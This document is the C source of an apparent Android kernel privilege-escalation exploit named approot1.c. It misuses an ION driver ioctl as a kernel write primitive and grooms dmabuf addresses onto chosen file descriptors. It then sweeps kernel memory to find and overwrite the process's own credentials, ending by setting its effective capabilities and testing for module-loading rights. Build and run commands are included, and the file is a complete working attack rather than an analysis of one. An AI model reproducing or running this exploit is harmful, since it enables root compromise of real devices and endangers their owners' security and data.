/* approot1.c - the app-context anchor, second attempt.
 *
 * The first attempt used cred->usage = thread count, pushed it to 1021, and never
 * matched. The reason is visible in the numbers: the value written into the
 * matching field is the grant buffer's IOVA, which is 0x80000000 | (page<<12), so
 * the page index has to equal the fd number. Reaching page 1021 needs 1021
 * allocations while only ~1020 fds are available, so the anchor was unreachable
 * by construction, not merely unlucky.
 *
 * A single-threaded process has cred->usage = 1, and fd 1 is free in an app, so
 * the anchor becomes page 1: IOVA 0x80001000, two allocations. That is what this
 * program measures:
 *
 *   fd 1  <- a dmabuf whose IOVA is 0x80001000
 *   sweep: a word equal to 1 at cred+0 stores 0x80001000 at cred+4 (uid)
 *   the uid changing is the signal that we found our own cred
 *
 * Then the second step is the chain's existing one, with fd 0 instead of 192:
 * cred+52 (cap_permitted.cap[1]) is zero, fd 0 holds the bit-16 buffer, so the
 * gate stores that IOVA at +56 = cap_effective.
 *
 * Everything the process needs is read into memory before the sweep: changing
 * uid makes the process unable to open the files it owns.
 *
 * Build: aarch64-linux-gnu-gcc -static -O2 -o approot1 approot1.c
 * Run:   run-as com.charepa ./approot1 <lo> <hi> <budget>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000
#define GUARD_FD 1
#define GUARD_IOVA 0x80001000u
#define CAP_FD 0
#define CAP_IOVA 0x80010000u
#define CRED_STEP 192
#define CRED_SLOTS 21

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_buf(int *out_fd, u32 *out_iova){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    *out_iova = 0;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) *out_iova = p.addr;
    *out_fd = d.fd;
    return 1;
}
/* hold every candidate until the wanted page index comes back, then let the rest
 * go: closing one returns its page to the IOVA allocator and the next allocation
 * lands on the same address again */
static int carve(u32 want, int *out_fd){
    static int held[4096]; int n = 0;
    while (n < 4096){
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv == want){ *out_fd = f; for (int i = 0; i < n; i++) close(held[i]); return 1; }
        held[n++] = f;
    }
    for (int i = 0; i < n; i++) close(held[i]);
    return 0;
}

int main(int argc, char **argv){
    u32 lo = argc > 1 ? (u32)strtoul(argv[1], NULL, 16) : 0x02000000u;
    u32 hi = argc > 2 ? (u32)strtoul(argv[2], NULL, 16) : 0x7f000000u;
    long budget = argc > 3 ? atol(argv[3]) : 8;

    LOG = fopen("/data/local/tmp/approot1.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("approot1 uid=%d pid=%d window=0x%08x..0x%08x budget=%ld\n",
        getuid(), getpid(), lo, hi, budget);

    /* usage for a single-threaded process is 1; print it so a mismatch is visible */
    { FILE *f = fopen("/proc/self/status", "r"); int t = -1;
      if (f){ char l[256]; while (fgets(l, sizeof l, f))
          if (!strncmp(l, "Threads:", 8)) { t = atoi(l + 8); break; } fclose(f); }
      say("Threads=%d (the guard word is cred->usage, expected 1)\n", t);
      if (t != 1) say("WARNING: more than one thread; usage will not be 1\n"); }

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        say("fds soft=%ld hard=%ld\n", (long)rl.rlim_cur, (long)rl.rlim_max);
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    int g; if (!carve(GUARD_IOVA, &g)){ say("no buffer with iova 0x%08x\n", GUARD_IOVA); return 0; }
    if (g != GUARD_FD){
        if (dup2(g, GUARD_FD) < 0){ say("dup2(%d) errno=%d\n", GUARD_FD, errno); return 0; }
        close(g);
    }
    say("guard buffer on fd %d, iova 0x%08x\n", GUARD_FD, GUARD_IOVA);

    u32 uid0 = (u32)getuid();
    say("uid before = %u (0x%08x)\n", uid0, uid0);

    long probes = 0, stores = 0; u64 found = 0;
    for (u32 p = lo; p < hi && !found && stores < budget; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int s = 0; s < CRED_SLOTS; s++){
            u64 o = pg + (u64)s * CRED_STEP;
            if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
            probes++;
            if (gate(o) != 0) continue;          /* the word is not 1 */
            stores++;
            if ((u32)getuid() != uid0){ found = o; break; }
            if (stores >= budget) break;
        }
    }
    say("sweep probes=%ld stores=%ld uid now=%u found=%s\n",
        probes, stores, (u32)getuid(), found ? "yes" : "no");
    if (!found){ say("APPROOT1 DONE (no hit)\n"); return 0; }

    say("own cred at 0x%llx\n", (unsigned long long)found);

    /* step two: aim fd 0 at the bit-16 buffer, then store into cap_effective.
     * cred+52 is cap_permitted.cap[1] == 0, and fd 0 is now a dmabuf, so the
     * gate passes there and writes at +56. */
    int c; if (!carve(CAP_IOVA, &c)){ say("no buffer with iova 0x%08x\n", CAP_IOVA); return 0; }
    if (c != CAP_FD){
        if (dup2(c, CAP_FD) < 0){ say("dup2(%d) errno=%d\n", CAP_FD, errno); return 0; }
        close(c);
    }
    int r = gate(found + 52);
    say("gate(cred+52) rc=%d errno=%d\n", r, errno);
    errno = 0;
    syscall(105, "\x7f""ELF", 4UL, "");
    say("probe_module errno=%d (8 means CAP_SYS_MODULE is held)\n", errno);
    say("APPROOT1 DONE\n");
    return 0;
}
